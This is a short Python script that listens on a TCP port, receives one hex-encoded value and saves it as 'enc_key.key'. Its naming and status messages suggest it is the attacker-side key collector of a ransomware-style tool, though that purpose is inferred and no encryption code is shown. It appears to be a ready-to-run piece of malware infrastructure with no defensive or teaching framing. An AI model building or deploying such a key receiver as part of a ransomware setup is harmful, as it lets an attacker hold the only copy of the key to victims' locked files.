#!/usr/bin/env python3


import socket


IP_ADDR="0.0.0.0"
PORT=1023  #ADD PORT HERE

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind((IP_ADDR,PORT))
print(f"[+] Listening for connections {IP_ADDR}:{PORT}")   
s.listen(1)

try:
    conn,addr=s.accept()
    print(f"[+] connection from {addr} established...")
    with conn:
        while True:
            try:
                key=conn.recv(1024).decode()
                decoded_key=bytes.fromhex(key)
                if not key:
                    print("[x] no data received.. closing socket..")
                    break
                with open("enc_key.key","wb") as target_file:
                    target_file.write(decoded_key)
                    print("[+] key downloaded to enc_key.key file...")
                break
            except Exception as e:
                print(f"[x] Error while receiving data: {e}")
                break
    
        
except KeyboardInterrupt:
    print("[x] interrupt detected.. exiting...")
    

finally:
    s.close()
 